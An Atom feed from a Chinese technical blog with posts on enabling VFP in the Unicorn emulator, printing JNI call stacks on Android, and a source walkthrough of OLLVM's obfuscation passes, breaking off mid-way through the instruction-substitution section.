<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>我的世界</title>
  <subtitle>0.0</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.ench4nt3r.com/"/>
  <updated>2018-10-15T13:13:09.176Z</updated>
  <id>http://www.ench4nt3r.com/</id>
  
  <author>
    <name>ench4nt3r</name>
    <email>ench4nt3r@qq.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>unicorn启用VFP</title>
    <link href="http://www.ench4nt3r.com/2018/10/15/unicorn%E5%90%AF%E7%94%A8VFP/"/>
    <id>http://www.ench4nt3r.com/2018/10/15/unicorn启用VFP/</id>
    <published>2018-10-15T13:06:25.000Z</published>
    <updated>2018-10-15T13:13:09.176Z</updated>
    
    <content type="html"><![CDATA[<p>使用 unicorn 模拟 arm 指令执行时，有时会遇到一些浮点指令（VMOV、VPUSH等），默认情况下 unicorn 会报一个 UC_ERR_INSN_INVALID 错误。</p>
<p>通过以下代码可以开启VFP支持。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">err = uc_open(UC_ARCH_ARM, UC_MODE_ARM, &amp;uc);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"uc_open %d\n"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> tmp_val;</span><br><span class="line"></span><br><span class="line">err = uc_reg_read(uc, UC_ARM_REG_C1_C0_2, &amp;tmp_val);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"uc_open %d\n"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tmp_val = tmp_val | (<span class="number">0xf</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line">err = uc_reg_write(uc, UC_ARM_REG_C1_C0_2, &amp;tmp_val);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"uc_open %d\n"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> enable_vfp = <span class="number">0x40000000</span>;</span><br><span class="line">err = uc_reg_write(uc, UC_ARM_REG_FPEXC, &amp;enable_vfp);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"uc_open %d\n"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<p>参考：<a href="https://github.com/unicorn-engine/unicorn/blob/master/tests/regress/arm_enable_vfp.c" target="_blank" rel="noopener">arm_enable_vfp.c</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用 unicorn 模拟 arm 指令执行时，有时会遇到一些浮点指令（VMOV、VPUSH等），默认情况下 unicorn 会报一个 UC_ERR_INSN_INVALID 错误。&lt;/p&gt;
&lt;p&gt;通过以下代码可以开启VFP支持。&lt;/p&gt;
&lt;figure class=&quot;hi
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>在JNI中打印调用栈</title>
    <link href="http://www.ench4nt3r.com/2018/04/13/post/"/>
    <id>http://www.ench4nt3r.com/2018/04/13/post/</id>
    <published>2018-04-13T13:56:30.000Z</published>
    <updated>2018-04-13T18:14:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>在网上搜索的Android打印调用栈，实现方式有以下三种：</p>
<ol>
<li>使用<code>CallStack</code>类</li>
<li>使用<code>_Unwind_Backtrace</code>函数</li>
<li>自己编译 libunwind</li>
</ol>
<p>第一种方法，在我的环境中（Android 5.1），可以在 libutils.so 找到相应的函数，可是并不能在 NDK中找到 <code>utils/CallStack.h</code> 这个头文件，所以得自己使用 <code>dlsym</code> 取得函数地址再调用，但是<code>CallStack</code>是一个 c++ 类，要调用比较麻烦，所以放弃这种方法。</p>
<p>第二种方法，这个就比较好了，能找到头文件，也能够成功编译，但是编译器将 <code>libgcc.a</code> 中的 <code>_Unwind_Backtrace</code> 函数跟我的动态库链接，这个实现似乎跟 Android 水土不服，获取的调用栈数量极少。</p>
<p>第三种，一看就很麻烦，放弃了。</p>
<p>本来呢，在第二种方法中，我希望的是使用 libunwind 的<code>_Unwind_Backtrace</code> 函数，然而看 libunwind 时发现，它并没有导出这个函数。不过意外的发现了 <code>unw_backtrace</code> 函数，从源码也能看出它具有跟 <code>_Unwind_Backtrace</code> 相同的功能，使用它的效果也是极好的，下面源码奉上：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*Unw_BackTrace_Func)</span><span class="params">(<span class="keyword">void</span>**, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_backtrace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> Unw_BackTrace_Func unw_backtrace = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (!unw_backtrace) &#123;</span><br><span class="line">        <span class="keyword">void</span> *hanle = dlopen(<span class="string">"libunwind.so"</span>, RTLD_NOW);</span><br><span class="line">        unw_backtrace = (Unw_BackTrace_Func)dlsym(hanle, <span class="string">"unw_backtrace"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *buffer[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> n = unw_backtrace((<span class="keyword">void</span>**)&amp;buffer, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *file = <span class="string">"\t\t\t\t"</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *symbol = <span class="string">"\t\t\t\t"</span>;</span><br><span class="line">        Dl_info info;</span><br><span class="line">        <span class="keyword">if</span> (dladdr(buffer[i], &amp;info)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (info.dli_sname) &#123;</span><br><span class="line">                symbol = info.dli_sname;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (info.dli_fname) &#123;</span><br><span class="line">                file = info.dli_fname;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LOGI(<span class="string">"#%02d: %p \t %s \t %s"</span>, i, buffer[i], symbol, file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一些参考：</p>
<p><a href="https://my.oschina.net/bugly/blog/1354954" target="_blank" rel="noopener">Android 平台 Native 代码的崩溃捕获机制及实现</a></p>
<p><a href="https://blog.csdn.net/xxooyc/article/details/51001345" target="_blank" rel="noopener">JNI中如何打印Call Stack</a></p>
<p><a href="https://blog.csdn.net/freshui/article/details/9456889" target="_blank" rel="noopener">Android下打印调试堆栈方法</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在网上搜索的Android打印调用栈，实现方式有以下三种：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用&lt;code&gt;CallStack&lt;/code&gt;类&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;_Unwind_Backtrace&lt;/code&gt;函数&lt;/li&gt;
&lt;li&gt;自己编译 libunwind&lt;
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ench4nt3r.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>ollvm源码分析</title>
    <link href="http://www.ench4nt3r.com/2018/02/26/post/"/>
    <id>http://www.ench4nt3r.com/2018/02/26/post/</id>
    <published>2018-02-26T05:23:39.000Z</published>
    <updated>2018-02-27T15:32:48.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="分割基本块"><a href="#分割基本块" class="headerlink" title="分割基本块"></a>分割基本块</h3><pre><code>-mllvm -split: activates basic block splitting. Improve the flattening when applied together.
-mllvm -split_num=3: if the pass is activated, applies it 3 times on each basic block. Default: 1
</code></pre><p>ollvm的每个混淆pass都是继承<code>FunctionPass</code>，所以他们的入口函数都是<code>runOnFunction</code>。</p>
<pre><code>bool SplitBasicBlock::runOnFunction(Function &amp;F) {
  if (!((SplitNum &gt; 1) &amp;&amp; (SplitNum &lt;= 10))) {
    return false;
  }

  Function *tmp = &amp;F;

  if (toObfuscate(flag, tmp, &quot;split&quot;)) {
    split(tmp);
    ++Split;
  }

  return false;
}
</code></pre><p><code>toObfuscate</code>函数通过查找<code>Functions annotations</code>和<code>flag</code>来判断是否启用了<code>split</code>。</p>
<pre><code>void SplitBasicBlock::split(Function *f) {
  std::vector&lt;BasicBlock *&gt; origBB;
  int splitN = SplitNum;

  // Save all basic blocks
  for (Function::iterator I = f-&gt;begin(), IE = f-&gt;end(); I != IE; ++I) {
    origBB.push_back(&amp;*I);
  }
</code></pre><p>首先保存所有的基本块。</p>
<pre><code>for (std::vector&lt;BasicBlock *&gt;::iterator I = origBB.begin(),
                                         IE = origBB.end();
     I != IE; ++I) {
  BasicBlock *curr = *I;

  // No need to split a 1 inst bb
  // Or ones containing a PHI node
  if (curr-&gt;size() &lt; 2 || containsPHI(curr)) {
    continue;
  }

  // Check splitN and current BB size
  if ((size_t)splitN &gt; curr-&gt;size()) {
    splitN = curr-&gt;size() - 1;
  }
</code></pre><p>接着遍历所有基本块。如果基本块只有一条指令或者包含PHI结点的，不分割该基本块。</p>
<pre><code>// Generate splits point
std::vector&lt;int&gt; test;
for (unsigned i = 1; i &lt; curr-&gt;size(); ++i) {
  test.push_back(i);
}

// Shuffle
if (test.size() != 1) {
  shuffle(test);
  std::sort(test.begin(), test.begin() + splitN);
}
</code></pre><p>生成基本块的分割点。</p>
<pre><code>  // Split
  BasicBlock::iterator it = curr-&gt;begin();
  BasicBlock *toSplit = curr;
  int last = 0;
  for (int i = 0; i &lt; splitN; ++i) {
    for (int j = 0; j &lt; test[i] - last; ++j) {
      ++it;
    }
    last = test[i];
    if(toSplit-&gt;size() &lt; 2)
      continue;
    toSplit = toSplit-&gt;splitBasicBlock(it, toSplit-&gt;getName() + &quot;.split&quot;);
  }

  ++Split;
}
</code></pre><p>最后调用<code>splitBasicBlock</code>分割基本块。</p>
<h3 id="控制流平坦化"><a href="#控制流平坦化" class="headerlink" title="控制流平坦化"></a>控制流平坦化</h3><pre><code>-mllvm -fla: activates control flow flattening
</code></pre><p>入口函数仍然是<code>runOnFunction</code>：</p>
<pre><code>bool Flattening::runOnFunction(Function &amp;F) {
  Function *tmp = &amp;F;
  // Do we obfuscate
  if (toObfuscate(flag, tmp, &quot;fla&quot;)) {
    if (flatten(tmp)) {
      ++Flattened;
    }
  }

  return false;
}
</code></pre><p>

<pre><code>bool Flattening::flatten(Function *f) {
  vector&lt;BasicBlock *&gt; origBB;
  BasicBlock *loopEntry;
  BasicBlock *loopEnd;
  LoadInst *load;
  SwitchInst *switchI;
  AllocaInst *switchVar;

  // SCRAMBLER
  char scrambling_key[16];
  llvm::cryptoutils-&gt;get_bytes(scrambling_key, 16);
  // END OF SCRAMBLER

  // Lower switch
  FunctionPass *lower = createLowerSwitchPass();
  lower-&gt;runOnFunction(*f);
</code></pre></p><p>在函数开始，使用<code>LowerSwitchPass</code>去除switch，将switch结构换成if结构。</p>
<pre><code>// Nothing to flatten
if (origBB.size() &lt;= 1) {
  return false;
}
</code></pre><p>只有一个基本块的函数将不处理。</p>
<pre><code>// Get a pointer on the first BB
Function::iterator tmp = f-&gt;begin();  //++tmp;
BasicBlock *insert = &amp;*tmp;

// If main begin with an if
BranchInst *br = NULL;
if (isa&lt;BranchInst&gt;(insert-&gt;getTerminator())) {
  br = cast&lt;BranchInst&gt;(insert-&gt;getTerminator());
}

if ((br != NULL &amp;&amp; br-&gt;isConditional()) ||
    insert-&gt;getTerminator()-&gt;getNumSuccessors() &gt; 1) {
  BasicBlock::iterator i = insert-&gt;end();
  --i;

  if (insert-&gt;size() &gt; 1) {
    --i;
  }

  BasicBlock *tmpBB = insert-&gt;splitBasicBlock(i, &quot;first&quot;);
  origBB.insert(origBB.begin(), tmpBB);
}

// Remove jump
  insert-&gt;getTerminator()-&gt;eraseFromParent();
</code></pre><p>如果第一个基本块的末尾是有条件的跳转指令，那么需要将它分割开，并且将它保存到<code>origBB</code>（这个数组包含着所有的基本块，除了函数的第一个基本块）。</p>
<pre><code>// Create switch variable and set as it
switchVar =
    new AllocaInst(Type::getInt32Ty(f-&gt;getContext()), 0, &quot;switchVar&quot;, insert);
new StoreInst(
    ConstantInt::get(Type::getInt32Ty(f-&gt;getContext()),
                     llvm::cryptoutils-&gt;scramble32(0, scrambling_key)),
    switchVar, insert);
</code></pre><p>创建switch变量并且初始化。</p>
<pre><code>// Create main loop
loopEntry = BasicBlock::Create(f-&gt;getContext(), &quot;loopEntry&quot;, f, insert);
loopEnd = BasicBlock::Create(f-&gt;getContext(), &quot;loopEnd&quot;, f, insert);

load = new LoadInst(switchVar, &quot;switchVar&quot;, loopEntry);

// Move first BB on top
insert-&gt;moveBefore(loopEntry);
BranchInst::Create(loopEntry, insert);

// loopEnd jump to loopEntry
BranchInst::Create(loopEntry, loopEnd);

BasicBlock *swDefault =
    BasicBlock::Create(f-&gt;getContext(), &quot;switchDefault&quot;, f, loopEnd);
BranchInst::Create(loopEnd, swDefault);

// Create switch instruction itself and set condition
switchI = SwitchInst::Create(&amp;*f-&gt;begin(), swDefault, 0, loopEntry);
switchI-&gt;setCondition(load);
</code></pre><p>创建两个基本块，存放循环头和尾的指令。然后将<code>first bb</code>移到到<code>loopEntry</code>的前面，并且创建一条跳转指令，从<code>first bb</code>跳到<code>loopEntry</code>。紧接着创建了一条从<code>loopEnd</code>跳到<code>loopEntry</code>的指令。最后，创建了<code>switch</code>指令和<code>switch default</code>块，并且创建相应的跳转。现在有了大概如下的结构：</p>
<pre><code>                  +--------+
                  |first bb|
                  +---+----+
                      |
                 +----v----+
                 |loopEntry| &lt;--------+
                 +----+----+          |
                      |               |
                 +----v---+           |
                 | switch |           |
                 +----+---+           |
                      |               |
       +--------------+               |
       |                              |
+------v-------+                      |
| default case |                      |
+------+-------+                      |
       |                              |
       +-------------+                |
                     |                |
                     |                |
                     v                |
               +-----+------+         |
               |  loopEnd   +---------+
               +------------+
</code></pre><p>

<pre><code>// Remove branch jump from 1st BB and make a jump to the while
  f-&gt;begin()-&gt;getTerminator()-&gt;eraseFromParent();

  BranchInst::Create(loopEntry, &amp;*f-&gt;begin());
</code></pre></p><p>删除<code>first bb</code>的跳转指令，改为跳转到<code>loopEntry</code></p>
<pre><code>// Put all BB in the switch
for (vector&lt;BasicBlock *&gt;::iterator b = origBB.begin(); b != origBB.end();
     ++b) {
  BasicBlock *i = *b;
  ConstantInt *numCase = NULL;

  // Move the BB inside the switch (only visual, no code logic)
  i-&gt;moveBefore(loopEnd);

  // Add case to switch
  numCase = cast&lt;ConstantInt&gt;(ConstantInt::get(
      switchI-&gt;getCondition()-&gt;getType(),
      llvm::cryptoutils-&gt;scramble32(switchI-&gt;getNumCases(), scrambling_key)));
  switchI-&gt;addCase(numCase, i);
}
</code></pre><p>将所有的基本块加入<code>switch</code>结构</p>
<pre><code>// Recalculate switchVar
for (vector&lt;BasicBlock *&gt;::iterator b = origBB.begin(); b != origBB.end();
     ++b) {
  BasicBlock *i = *b;
  ConstantInt *numCase = NULL;

  // Ret BB
  if (i-&gt;getTerminator()-&gt;getNumSuccessors() == 0) {
    continue;
  }

  // If it&apos;s a non-conditional jump
  if (i-&gt;getTerminator()-&gt;getNumSuccessors() == 1) {
    // Get successor and delete terminator
    BasicBlock *succ = i-&gt;getTerminator()-&gt;getSuccessor(0);
    i-&gt;getTerminator()-&gt;eraseFromParent();

    // Get next case
    numCase = switchI-&gt;findCaseDest(succ);

    // If next case == default case (switchDefault)
    if (numCase == NULL) {
      numCase = cast&lt;ConstantInt&gt;(
          ConstantInt::get(switchI-&gt;getCondition()-&gt;getType(),
                           llvm::cryptoutils-&gt;scramble32(
                               switchI-&gt;getNumCases() - 1, scrambling_key)));
    }

    // Update switchVar and jump to the end of loop
    new StoreInst(numCase, load-&gt;getPointerOperand(), i);
    BranchInst::Create(loopEnd, i);
    continue;
}
</code></pre><p>接下来是根据原先的跳转来计算switch变量。对于没有后继（return BB）的基本块，直接跳过。对于只有一个后继的基本块，首先删除跳转指令，并且通过后继基本块来搜索对应的switch case，根据case创建一条存储指令，达到跳转的目的。</p>
<pre><code>    // If it&apos;s a conditional jump
  if (i-&gt;getTerminator()-&gt;getNumSuccessors() == 2) {
    // Get next cases
    ConstantInt *numCaseTrue =
        switchI-&gt;findCaseDest(i-&gt;getTerminator()-&gt;getSuccessor(0));
    ConstantInt *numCaseFalse =
        switchI-&gt;findCaseDest(i-&gt;getTerminator()-&gt;getSuccessor(1));

    // Check if next case == default case (switchDefault)
    if (numCaseTrue == NULL) {
      numCaseTrue = cast&lt;ConstantInt&gt;(
          ConstantInt::get(switchI-&gt;getCondition()-&gt;getType(),
                           llvm::cryptoutils-&gt;scramble32(
                               switchI-&gt;getNumCases() - 1, scrambling_key)));
    }

    if (numCaseFalse == NULL) {
      numCaseFalse = cast&lt;ConstantInt&gt;(
          ConstantInt::get(switchI-&gt;getCondition()-&gt;getType(),
                           llvm::cryptoutils-&gt;scramble32(
                               switchI-&gt;getNumCases() - 1, scrambling_key)));
    }

    // Create a SelectInst
    BranchInst *br = cast&lt;BranchInst&gt;(i-&gt;getTerminator());
    SelectInst *sel =
        SelectInst::Create(br-&gt;getCondition(), numCaseTrue, numCaseFalse, &quot;&quot;,
                           i-&gt;getTerminator());

    // Erase terminator
    i-&gt;getTerminator()-&gt;eraseFromParent();

    // Update switchVar and jump to the end of loop
    new StoreInst(sel, load-&gt;getPointerOperand(), i);
    BranchInst::Create(loopEnd, i);
    continue;
  }
}
</code></pre><p>两个后继的情况跟一个后继的处理方法相似，不同的是，创建一条select指令，根据条件的结果来选择分支。</p>
<h3 id="虚假控制流"><a href="#虚假控制流" class="headerlink" title="虚假控制流"></a>虚假控制流</h3><pre><code>-mllvm -bcf: activates the bogus control flow pass
-mllvm -bcf_loop=3: if the pass is activated, applies it 3 times on a function. Default: 1
-mllvm -bcf_prob=40: if the pass is activated, a basic bloc will be obfuscated with a probability of 40%. Default: 30
</code></pre><p>

<pre><code>void bogus(Function &amp;F) {
    ...

    int NumObfTimes = ObfTimes;

    // Real begining of the pass
    // Loop for the number of time we run the pass on the function
    do{
      DEBUG_WITH_TYPE(&quot;cfg&quot;, errs() &lt;&lt; &quot;bcf: Function &quot; &lt;&lt; F.getName()
          &lt;&lt;&quot;, before the pass:\n&quot;);
      DEBUG_WITH_TYPE(&quot;cfg&quot;, F.viewCFG());
      // Put all the function&apos;s block in a list
      std::list&lt;BasicBlock *&gt; basicBlocks;
      for (Function::iterator i=F.begin();i!=F.end();++i) {
        basicBlocks.push_back(&amp;*i);
      }
</code></pre></p><p>do循环的条件表达式是<code>--NumObfTimes &gt; 0</code>，<code>NumObfTimes</code>关联着<code>-bcf_loop</code>选项的值。首先，还是保存基本块。</p>
<pre><code>      while(!basicBlocks.empty()){
        NumBasicBlocks ++;
        // Basic Blocks&apos; selection

        if((int)llvm::cryptoutils-&gt;get_range(100) &lt;= ObfProbRate){
          DEBUG_WITH_TYPE(&quot;opt&quot;, errs() &lt;&lt; &quot;bcf: Block &quot;
              &lt;&lt; NumBasicBlocks &lt;&lt;&quot; selected. \n&quot;);
          hasBeenModified = true;
          ++NumModifiedBasicBlocks;
          NumAddedBasicBlocks += 3;
          FinalNumBasicBlocks += 3;
          // Add bogus flow to the given Basic Block (see description)
          BasicBlock *basicBlock = basicBlocks.front();
          addBogusFlow(basicBlock, F);
        }
        else{
          DEBUG_WITH_TYPE(&quot;opt&quot;, errs() &lt;&lt; &quot;bcf: Block &quot;
              &lt;&lt; NumBasicBlocks &lt;&lt;&quot; not selected.\n&quot;);
        }
        // remove the block from the list
        basicBlocks.pop_front();

        if(firstTime){ // first time we iterate on this function
          ++InitNumBasicBlocks;
          ++FinalNumBasicBlocks;
        }
      } // end of while(!basicBlocks.empty())

      ....
    }while(--NumObfTimes &gt; 0);
}
</code></pre><p>遍历基本块，随机决定当前基本块是否需要修改，<code>ObfProbRate</code>变量关联着<code>-bcf_prob</code>选项的值。如果命中，则调用<code>addBogusFlow</code>函数。</p>
<pre><code>virtual void addBogusFlow(BasicBlock * basicBlock, Function &amp;F){
  ...
  BasicBlock::iterator i1 = basicBlock-&gt;begin();
  if(basicBlock-&gt;getFirstNonPHIOrDbgOrLifetime())
    i1 = (BasicBlock::iterator)basicBlock-&gt;getFirstNonPHIOrDbgOrLifetime();
  Twine *var;
  var = new Twine(&quot;originalBB&quot;);
  BasicBlock *originalBB = basicBlock-&gt;splitBasicBlock(i1, *var);
</code></pre><p>在<code>addBogusFlow</code>函数中，首先基本块分为两部分，第一部分只包含PHI结点、调试信息、lifttime，第二部分包含着剩余的指令。</p>
<pre><code>Twine * var3 = new Twine(&quot;alteredBB&quot;);
BasicBlock *alteredBB = createAlteredBasicBlock(originalBB, *var3, &amp;F);
</code></pre><p>接着，由<code>createAlteredBasicBlock</code>函数复制基本块，并增加一些花指令。</p>
<pre><code>Twine * var4 = new Twine(&quot;condition&quot;);
FCmpInst * condition = new FCmpInst(*basicBlock, FCmpInst::FCMP_TRUE , LHS, RHS, *var4);

BranchInst::Create(originalBB, alteredBB, (Value *)condition, basicBlock);

BranchInst::Create(originalBB, alteredBB);
</code></pre><p>现在，我们有三个基本块，第一个是<code>basicBlock</code>，<code>addBogusFlow</code>函数的参数，第二个是<code>originalBB</code>，由<code>basicBlock</code>分割出来，第三个是<code>alteredBB</code>，由<code>createAlteredBasicBlock</code>创建的混淆块，然后将主要是将这三个块拼接起来：</p>
<p><img src="/img/abb4854f756749b00a11719d4a6bdef8.png" alt=""></p>
<pre><code>BasicBlock::iterator i = originalBB-&gt;end();

Twine * var5 = new Twine(&quot;originalBBpart2&quot;);
BasicBlock * originalBBpart2 = originalBB-&gt;splitBasicBlock(--i , *var5);

originalBB-&gt;getTerminator()-&gt;eraseFromParent();

Twine * var6 = new Twine(&quot;condition2&quot;);
FCmpInst * condition2 = new FCmpInst(*originalBB, CmpInst::FCMP_TRUE , LHS, RHS, *var6);
BranchInst::Create(originalBBpart2, alteredBB, (Value *)condition2, originalBB);
</code></pre><p>在<code>addBogusFlow</code>函数的最后，将<code>originalBB</code>的最后一条语句分割出来，然后拼接：</p>
<p><img src="/img/f70fd543b7c6617edf1d06ff2fbdaff3.png" alt=""></p>
<p><code>addBogusFlow</code>和<code>bogus</code>函数执行完成后，回到<code>runOnFunction</code>，接着执行<code>doF</code>函数</p>
<pre><code>bool doF(Module &amp;M){
     Twine * varX = new Twine(&quot;x&quot;);
     Twine * varY = new Twine(&quot;y&quot;);
     Value * x1 =ConstantInt::get(Type::getInt32Ty(M.getContext()), 0, false);
     Value * y1 =ConstantInt::get(Type::getInt32Ty(M.getContext()), 0, false);

     GlobalVariable     * x = new GlobalVariable(M, Type::getInt32Ty(M.getContext()), false,
         GlobalValue::CommonLinkage, (Constant * )x1,
         *varX);
     GlobalVariable     * y = new GlobalVariable(M, Type::getInt32Ty(M.getContext()), false,
         GlobalValue::CommonLinkage, (Constant * )y1,
         *varY);
</code></pre><p>首先，创建了两个全局变量。</p>
<pre><code>for(Module::iterator mi = M.begin(), me = M.end(); mi != me; ++mi){
        for(Function::iterator fi = mi-&gt;begin(), fe = mi-&gt;end(); fi != fe; ++fi){

          TerminatorInst * tbb= fi-&gt;getTerminator();

          if(tbb-&gt;getOpcode() == Instruction::Br){

            BranchInst * br = (BranchInst *)(tbb);

            if(br-&gt;isConditional()){

              FCmpInst * cond = (FCmpInst *)br-&gt;getCondition();
              unsigned opcode = cond-&gt;getOpcode();

              if(opcode == Instruction::FCmp){
                if (cond-&gt;getPredicate() == FCmpInst::FCMP_TRUE){
                  toDelete.push_back(cond); // The condition
                  toEdit.push_back(tbb);    // The branch using the condition
                }
              }
            }
          }
        }
      }
</code></pre><p>紧接着，遍历模块的所有基本块，搜索出条件永远为<code>true</code>的比较语句。</p>
<pre><code>for(std::vector&lt;Instruction*&gt;::iterator i =toEdit.begin();i!=toEdit.end();++i){
  opX = new LoadInst ((Value *)x, &quot;&quot;, (*i));
  opY = new LoadInst ((Value *)y, &quot;&quot;, (*i));

  op = BinaryOperator::Create(Instruction::Sub, (Value *)opX,
      ConstantInt::get(Type::getInt32Ty(M.getContext()), 1,
        false), &quot;&quot;, (*i));
  op1 = BinaryOperator::Create(Instruction::Mul, (Value *)opX, op, &quot;&quot;, (*i));
  op = BinaryOperator::Create(Instruction::URem, op1,
      ConstantInt::get(Type::getInt32Ty(M.getContext()), 2,
        false), &quot;&quot;, (*i));
  condition = new ICmpInst((*i), ICmpInst::ICMP_EQ, op,
      ConstantInt::get(Type::getInt32Ty(M.getContext()), 0,
        false));
  condition2 = new ICmpInst((*i), ICmpInst::ICMP_SLT, opY,
      ConstantInt::get(Type::getInt32Ty(M.getContext()), 10,
        false));
  op1 = BinaryOperator::Create(Instruction::Or, (Value *)condition,
      (Value *)condition2, &quot;&quot;, (*i));

  BranchInst::Create(((BranchInst*)*i)-&gt;getSuccessor(0),
      ((BranchInst*)*i)-&gt;getSuccessor(1),(Value *) op1,
      ((BranchInst*)*i)-&gt;getParent());
  DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Erase branch instruction:&quot;
      &lt;&lt; *((BranchInst*)*i) &lt;&lt; &quot;\n&quot;);
  (*i)-&gt;eraseFromParent(); // erase the branch
}
</code></pre><p>在最后，用表达式<code>(x - 1) * x % 2 == 0 || y &lt; 0</code>替换<code>永远为true</code>的比较语句。从上面可以看出，<code>doF</code>函数将所有<code>永远为true</code>的比较语句替换为<code>(x - 1) * x % 2 == 0 || y &lt; 0</code>，并且，这个表达式的结果也<code>永远为true</code></p>
<h3 id="指令替换"><a href="#指令替换" class="headerlink" title="指令替换"></a>指令替换</h3><pre><code>-mllvm -sub: activate instructions substitution
-mllvm -sub_loop=3: if the pass is activated, applies it 3 times on a function. Default : 1.
</code></pre><p>

<pre><code>bool Substitution::substitute(Function *f) {
  Function *tmp = f;

  int times = ObfTimes;
  do {
    for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) {
      for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) {

        if (inst-&gt;isBinaryOp()) {

          switch (inst-&gt;getOpcode()) {

          case Instruction::Add:
            (this-&gt;*funcAdd[llvm::cryptoutils-&gt;get_range(NUMBER_ADD_SUBST)])(
                cast&lt;BinaryOperator&gt;(inst));
            break;

          case BinaryOperator::Sub:
            (this-&gt;*funcSub[llvm::cryptoutils-&gt;get_range(NUMBER_SUB_SUBST)])(
                cast&lt;BinaryOperator&gt;(inst));
            break;

          case Instruction::And:
            (this-&gt;*funcAnd[llvm::cryptoutils-&gt;get_range(2)])(cast&lt;BinaryOperator&gt;(inst));
            break;

          case Instruction::Or:
            (this-&gt;*funcOr[llvm::cryptoutils-&gt;get_range(2)])(cast&lt;BinaryOperator&gt;(inst));
            break;

          case Instruction::Xor:
            (this-&gt;*funcXor[llvm::cryptoutils-&gt;get_range(2)])(cast&lt;BinaryOperator&gt;(inst));
            break;
          }              // End switch
        }                // End isBinaryOp
      }                  // End for basickblock
    }                    // End for Function
  } while (--times &gt; 0); // for times
  return false;
}
</code></pre></p><p>从源码可以看出，ollvm只对加、减、或、与、异或这五种操作进行替换，<code>funcXXX</code>变量都是函数数组，随机的选择一种变换进行操作。<code>ObfTimes</code>关联<code>-sub_loop</code>。</p>
<pre><code>// a = b - (-c)
op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo);
op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, &quot;&quot;, bo);
bo-&gt;replaceAllUsesWith(op);

// a = -(-b + (-c))
op = BinaryOperator::CreateNeg(bo-&gt;getOperand(0), &quot;&quot;, bo);
